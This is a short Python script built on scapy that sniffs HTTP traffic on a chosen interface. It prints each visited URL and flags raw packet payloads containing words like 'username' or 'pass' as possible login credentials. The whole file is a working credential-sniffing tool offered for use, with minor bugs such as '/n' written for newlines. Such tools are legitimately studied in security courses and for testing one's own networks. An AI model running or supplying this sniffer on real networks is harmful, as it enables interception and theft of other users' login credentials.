#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse

        
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="spcefiy an interface to sniff to ")
    (options, arguments) = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packets_sniff)
    

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "pass", "agent", "user", "e-mail", "mail"]
        for keyword in keywords:
            if keyword in load:
                return load

def packets_sniff(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTP REQUEST >> " + url)
        get_login = get_login_info(packet)
        if get_login:
            print("/n/n/possible username/pass >> " + get_login + "/n/n")

options = get_arguments()
sniff(options.interface)
